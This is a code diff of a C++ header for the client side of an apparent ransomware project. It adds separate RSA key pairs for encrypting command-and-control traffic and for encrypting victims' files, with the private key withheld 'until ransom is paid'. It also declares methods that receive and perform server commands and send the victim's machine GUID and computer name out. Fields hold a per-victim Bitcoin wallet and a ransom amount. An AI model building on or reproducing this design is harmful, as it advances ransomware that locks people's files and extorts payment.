@@ -29,12 +29,15 @@ public:
     void               SetDesktopName(auto name) { this->m_ComputerName = name; }
     const std::string  GetMachineGUID() const { return this->m_MachineGUID; }
     void               SetMachineGUID(auto name) { this->m_MachineGUID = name; }
-    void               SetEncryptionKeys(RSAKeys& keys) { this->m_Secrets = keys; }
+    void               SetEncryptionKeys(RSAKeys& keys) { this->m_RequestSecrets = keys; }
+    void               SetRequestSecrets(RSAKeys& keys) { this->m_RequestSecrets = keys; }
+    void               SetRansomSecrets(RSAKeys& keys) { this->m_RansomSecrets = keys; }
 
 private:
     std::string        m_ComputerName = "";  // remote host computer name. e.g DESKTOP-AJDU31S
     std::string        m_MachineGUID  = "";  // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....
-    RSAKeys            m_Secrets      = {};         // Client RSA keys saved as strings
+    RSAKeys            m_RequestSecrets = {}; // RSA key pair used to encrypt and decrypt requests to and from server
+    RSAKeys            m_RansomSecrets = {}; // RSA key pair used to encrypt and decrypt files. public key only stored on client until ransom is paid
     SOCKET             m_UDPSocket    = INVALID_SOCKET;
     SOCKET             m_TCPSocket    = INVALID_SOCKET;
 
@@ -49,8 +52,12 @@ public:
     BOOL               SendMessageToServer(const Server& dest, ClientMessage message);
     BOOL               SendMessageToServer(std::string message, BOOL encrypted = TRUE); // Send a encrypted string to TCP server
     BOOL               SendEncryptedMessageToServer(const Server& dest, ClientMessage message);
-    BOOL               ListenForServerCommands();   // listen for commands from the server and perform them
+    void               ListenForServerCommands();   // listen for commands from the server and perform them
     BOOL               PerformCommand(const ServerCommand& command, ClientResponse& outResponse); // Perform a command from the tcp server
+
+
+    template <typename _Ty>
+    BOOL               GetEncryptedMessageOnServer(const Server& dest, _Ty& out);
 
     template <typename _Ty>
     BOOL               ReceiveMessageFromServer(const Server& who, _Ty& out, sockaddr_in& outAddr);
@@ -59,7 +66,7 @@ private:
     void               ReceiveCommandsFromServer(); // thread to continuously receive 'ServerCommand' messages from the server
     void               SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
     void               SetRemoteMachineGUID();      // set this->m_MachineGUID to the current PCs windows machine guid
-    BOOL               GetPublicRSAKeyFromServer(); // get public rsa key from server, save it to this->m_Secrets as a string
+    BOOL               GetRequestRSAKeysFromServer(); // get public rsa key from server, save it to this->m_Secrets as a string
     BOOL               SendMachineGUIDToServer();   // send machine guid to tcp server. encrypted
     BOOL               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted
     BOOL               IsServerAwaitingResponse(const ServerCommand& commandPerformed);
@@ -76,8 +83,9 @@ public:
     void               Disconnect(); // clean up and close sockets. free bio* secrets
 
     const sockaddr_in  GetAddressInfo()            const { return this->AddressInfo; }
-    const RSAKeys&     GetSecrets()                const { return this->m_Secrets; }
+    const RSAKeys&     GetSecrets()                const { return this->m_RequestSecrets; }
     const SOCKET       GetSocket(SocketTypes type) const { return ( type == TCP ) ? this->m_TCPSocket : this->m_UDPSocket; }
+    const RSAKeys& GetRequestSecrets()         const { return this->m_RequestSecrets; }
 
     std::string        UniqueBTCWalletAddress;      // Wallet address to send ransom money to
     long               RansomAmountUSD  = 0;        // amount the client must pay for rsa private key in usd
